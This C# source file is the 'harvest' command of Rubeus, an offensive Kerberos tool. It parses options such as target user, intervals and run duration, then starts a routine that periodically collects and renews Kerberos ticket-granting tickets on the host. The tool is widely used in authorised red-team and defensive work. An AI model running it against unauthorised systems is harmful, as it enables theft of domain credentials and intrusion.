using System;
using System.Collections.Generic;


namespace Rubeus.Commands
{
    public class HarvestCommand : ICommand
    {
        public static string CommandName => "harvest";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: TGT Harvesting (with auto-renewal)");

            string targetUser = null;
            int monitorInterval = 60; // how often to check for new TGTs
            int displayInterval = 1200; // how often to display the working set of TGTs
            string registryBasePath = null;
            bool nowrap = false;
            int runFor = 0;

            if (arguments.ContainsKey("/nowrap"))
            {
                nowrap = true;
            }
            if (arguments.ContainsKey("/filteruser"))
            {
                targetUser = arguments["/filteruser"];
            }
            if (arguments.ContainsKey("/targetuser"))
            {
                targetUser = arguments["/targetuser"];
            }
            if (arguments.ContainsKey("/interval"))
            {
                monitorInterval = Int32.Parse(arguments["/interval"]);
                displayInterval = Int32.Parse(arguments["/interval"]);
            }
            if (arguments.ContainsKey("/monitorinterval"))
            {
                monitorInterval = Int32.Parse(arguments["/monitorinterval"]);
            }
            if (arguments.ContainsKey("/displayinterval"))
            {
                displayInterval = Int32.Parse(arguments["/displayinterval"]);
            }
            if (arguments.ContainsKey("/registry"))
            {
                registryBasePath = arguments["/registry"];
            }
            if (arguments.ContainsKey("/runfor"))
            {
                runFor = Int32.Parse(arguments["/runfor"]);
            }

            if (!String.IsNullOrEmpty(targetUser))
            {
                Console.WriteLine("[*] Target user     : {0:x}", targetUser);
            }
            Console.WriteLine("[*] Monitoring every {0} seconds for new TGTs", monitorInterval);
            Console.WriteLine("[*] Displaying the working TGT cache every {0} seconds", displayInterval);
            if (runFor > 0)
            {
                Console.WriteLine("[*] Running collection for {0} seconds", runFor);
            }
            Console.WriteLine("");

            var harvester = new Harvest(monitorInterval, displayInterval, true, targetUser, registryBasePath, nowrap, runFor);
            harvester.HarvestTicketGrantingTickets();
        }
    }
}
